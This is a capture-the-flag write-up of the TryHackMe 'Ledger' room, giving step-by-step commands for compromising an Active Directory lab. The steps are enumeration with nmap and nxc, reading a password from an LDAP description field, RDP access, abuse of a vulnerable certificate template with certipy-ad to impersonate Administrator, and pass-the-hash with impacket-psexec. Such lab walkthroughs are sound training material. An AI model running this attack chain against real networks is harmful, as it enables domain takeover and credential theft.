# Ledger

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://tryhackme.com/room/ledger" %}

***

First , Let's use The `nmap` scan to check the which services is running .

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
sudo nmap -sV -sC -Pn 10.48.167.1 -T4
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (965).png" alt=""><figcaption></figcaption></figure>

Add The Domain and DNS name in the `hosts` file !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
cat /etc/hosts
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (966).png" alt=""><figcaption></figcaption></figure>

User enumeration using `ldap` and I got the password in the description field `CHANGEME2023!`

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
nxc ldap 10.48.167.1 -u 'guest' -p '' --users
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (967).png" alt=""><figcaption></figcaption></figure>

Check The  `rdp` session with the valid credentials.

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
nxc rdp 10.48.167.1 -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!'
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (968).png" alt=""><figcaption></figcaption></figure>

Connect using `xfreerdp` !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
xfreerdp /u:SUSANNA_MCKNIGHT /p:'CHANGEME2023!' /v:10.48.167.1 /dynamic-resolution +clipboard /cert:ignore
```
{% endcode %}

Grep The `user.txt` file !

<figure><img src="../.gitbook/assets/image (969).png" alt=""><figcaption></figcaption></figure>

Let’s try to Find The Vulnerable Certificate Template Enumerate !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
certipy-ad find -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -target labyrinth.thm.local -stdout -vulnerable
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (970).png" alt=""><figcaption></figcaption></figure>

And Then This .

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
certipy-ad req -username 'SUSANNA_MCKNIGHT@thm.local' -password 'CHANGEME2023!' -ca thm-LABYRINTH-CA -target labyrinth.thm.local -template ServerAuth -upn Administrator@thm.local
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (971).png" alt=""><figcaption></figcaption></figure>

Then Dump The Administrator `NTLM` Hashes .

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
certipy-ad auth -pfx administrator.pfx -domain thm.local -dc-ip 10.48.167.1
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (972).png" alt=""><figcaption></figcaption></figure>

Using this hash, we can use Impacket’s psexec to spawn a shell and read the root flag from the Administrator’s desktop to complete the room

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-psexec -k -hashes :07d677a6cf40925beb80ad6428752322 thm.local/Administrator@labyrinth.thm.local
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (973).png" alt=""><figcaption></figcaption></figure>
